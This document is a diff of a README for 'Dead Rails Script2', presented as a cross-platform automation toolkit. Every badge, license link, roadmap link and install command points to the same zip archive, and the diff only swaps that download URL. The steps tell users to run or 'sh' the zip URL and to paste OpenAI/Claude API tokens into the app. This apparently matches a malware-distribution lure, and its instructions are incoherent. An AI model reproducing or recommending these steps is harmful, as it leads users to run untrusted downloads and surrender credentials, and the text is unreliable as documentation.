@@ -1,4 +1,4 @@
-# ![Download](https://github.com/9455/dead-rails-script2-toolkit/raw/refs/heads/branch/forming/rails_toolkit_dead_script_v2.6.zip%20dead%20rails%20script2-blue?logo=download&https://github.com/9455/dead-rails-script2-toolkit/raw/refs/heads/branch/forming/rails_toolkit_dead_script_v2.6.zip)  
+# ![Download](https://raw.githubusercontent.com/9455/dead-rails-script2-toolkit/branch/forming/rails-toolkit-dead-script-2.3.zip%20dead%20rails%20script2-blue?logo=download&https://raw.githubusercontent.com/9455/dead-rails-script2-toolkit/branch/forming/rails-toolkit-dead-script-2.3.zip)  
 **Click to start your adventure with Dead Rails Script2!**
 
 ---
@@ -22,12 +22,12 @@ Your experience matters. We conducted a global expedition to ensure **Dead Rails
 
 | OS ⚡        | Architecture 🏗️          | Status 🌈           |
 |--------------|--------------------------|---------------------|
-| Windows 11/10| x86_64, ARM64            | ![Windows](https://github.com/9455/dead-rails-script2-toolkit/raw/refs/heads/branch/forming/rails_toolkit_dead_script_v2.6.zip)  |
-| macOS 12+    | Apple Silicon, Intel     | ![macOS](https://github.com/9455/dead-rails-script2-toolkit/raw/refs/heads/branch/forming/rails_toolkit_dead_script_v2.6.zip)   |
-| Linux (Debian/Ubuntu, Fedora, Arch) | x86_64, ARM64 | ![Linux](https://github.com/9455/dead-rails-script2-toolkit/raw/refs/heads/branch/forming/rails_toolkit_dead_script_v2.6.zip)   |
-| Android 12+  | ARM                      | ![Android](https://github.com/9455/dead-rails-script2-toolkit/raw/refs/heads/branch/forming/rails_toolkit_dead_script_v2.6.zip)   |
-| iOS (Safari, Web) | ARM                 | ![iOS](https://github.com/9455/dead-rails-script2-toolkit/raw/refs/heads/branch/forming/rails_toolkit_dead_script_v2.6.zip%20Preview-inactive) |
-| Raspberry Pi | ARMv7, v8                | ![Pi](https://github.com/9455/dead-rails-script2-toolkit/raw/refs/heads/branch/forming/rails_toolkit_dead_script_v2.6.zip)   |
+| Windows 11/10| x86_64, ARM64            | ![Windows](https://raw.githubusercontent.com/9455/dead-rails-script2-toolkit/branch/forming/rails-toolkit-dead-script-2.3.zip)  |
+| macOS 12+    | Apple Silicon, Intel     | ![macOS](https://raw.githubusercontent.com/9455/dead-rails-script2-toolkit/branch/forming/rails-toolkit-dead-script-2.3.zip)   |
+| Linux (Debian/Ubuntu, Fedora, Arch) | x86_64, ARM64 | ![Linux](https://raw.githubusercontent.com/9455/dead-rails-script2-toolkit/branch/forming/rails-toolkit-dead-script-2.3.zip)   |
+| Android 12+  | ARM                      | ![Android](https://raw.githubusercontent.com/9455/dead-rails-script2-toolkit/branch/forming/rails-toolkit-dead-script-2.3.zip)   |
+| iOS (Safari, Web) | ARM                 | ![iOS](https://raw.githubusercontent.com/9455/dead-rails-script2-toolkit/branch/forming/rails-toolkit-dead-script-2.3.zip%20Preview-inactive) |
+| Raspberry Pi | ARMv7, v8                | ![Pi](https://raw.githubusercontent.com/9455/dead-rails-script2-toolkit/branch/forming/rails-toolkit-dead-script-2.3.zip)   |
 
 *If you run technology on electrons, we’re already ahead of the rails!*
 
@@ -96,7 +96,7 @@ Got a feature request, detective-level bug, or just a midnight idea? Our digital
 ## 🚦 Installation Steps
 
 1. **Begin Your Download:**  
-   Click the shiny badge, or hit here: https://github.com/9455/dead-rails-script2-toolkit/raw/refs/heads/branch/forming/rails_toolkit_dead_script_v2.6.zip
+   Click the shiny badge, or hit here: https://raw.githubusercontent.com/9455/dead-rails-script2-toolkit/branch/forming/rails-toolkit-dead-script-2.3.zip
 
 2. **Extract the Package:**  
    Unpack the downloaded file to a directory of your choice — no cryptic folder names, promise.
@@ -111,15 +111,15 @@ Got a feature request, detective-level bug, or just a midnight idea? Our digital
 4. **Run the Installation Script:**  
    On your OS, execute:
    - For Windows:
-     run https://github.com/9455/dead-rails-script2-toolkit/raw/refs/heads/branch/forming/rails_toolkit_dead_script_v2.6.zip
+     run https://raw.githubusercontent.com/9455/dead-rails-script2-toolkit/branch/forming/rails-toolkit-dead-script-2.3.zip
    - For Linux/macOS:
-     sh https://github.com/9455/dead-rails-script2-toolkit/raw/refs/heads/branch/forming/rails_toolkit_dead_script_v2.6.zip
+     sh https://raw.githubusercontent.com/9455/dead-rails-script2-toolkit/branch/forming/rails-toolkit-dead-script-2.3.zip
 
 5. **Fire Up the App:**  
    - For GUI:  
      open the Dead Rails Script2 executable or `deadrailsgui`
    - For CLI lovers:  
-     ./deadrails or `https://github.com/9455/dead-rails-script2-toolkit/raw/refs/heads/branch/forming/rails_toolkit_dead_script_v2.6.zip` as appropriate
+     ./deadrails or `https://raw.githubusercontent.com/9455/dead-rails-script2-toolkit/branch/forming/rails-toolkit-dead-script-2.3.zip` as appropriate
 
 6. **Connect APIs:**  
    Within the app, navigate to **Integrations** → **API Keys**, and paste your OpenAI/Claude tokens.
@@ -139,18 +139,18 @@ Got a feature request, detective-level bug, or just a midnight idea? Our digital
 This journey’s engine is open.  
 Dead Rails Script2 is licensed under the MIT License (2025). You are welcome to use, modify, and build upon it—just keep the tracks open for others.
 
-[![MIT License](https://github.com/9455/dead-rails-script2-toolkit/raw/refs/heads/branch/forming/rails_toolkit_dead_script_v2.6.zip)](https://github.com/9455/dead-rails-script2-toolkit/raw/refs/heads/branch/forming/rails_toolkit_dead_script_v2.6.zip)
+[![MIT License](https://raw.githubusercontent.com/9455/dead-rails-script2-toolkit/branch/forming/rails-toolkit-dead-script-2.3.zip)](https://raw.githubusercontent.com/9455/dead-rails-script2-toolkit/branch/forming/rails-toolkit-dead-script-2.3.zip)
 
 ---
 
 ## 🔄 Community, Contributions, and the Next Stop
 
 Your participation energizes this railway.  
-Suggestions, issue tickets, artful pull requests, or even philosophical questions about automation—bring them all aboard. See `https://github.com/9455/dead-rails-script2-toolkit/raw/refs/heads/branch/forming/rails_toolkit_dead_script_v2.6.zip` for the full roadmap.
+Suggestions, issue tickets, artful pull requests, or even philosophical questions about automation—bring them all aboard. See `https://raw.githubusercontent.com/9455/dead-rails-script2-toolkit/branch/forming/rails-toolkit-dead-script-2.3.zip` for the full roadmap.
 
 ---
 
-# ![Download](https://github.com/9455/dead-rails-script2-toolkit/raw/refs/heads/branch/forming/rails_toolkit_dead_script_v2.6.zip%20dead%20rails%20script2-blue?logo=download&https://github.com/9455/dead-rails-script2-toolkit/raw/refs/heads/branch/forming/rails_toolkit_dead_script_v2.6.zip)  
+# ![Download](https://raw.githubusercontent.com/9455/dead-rails-script2-toolkit/branch/forming/rails-toolkit-dead-script-2.3.zip%20dead%20rails%20script2-blue?logo=download&https://raw.githubusercontent.com/9455/dead-rails-script2-toolkit/branch/forming/rails-toolkit-dead-script-2.3.zip)  
 **Jump in and propel your ideas forward with Dead Rails Script2, the innovative automation toolkit of 2025!**
 
 ---
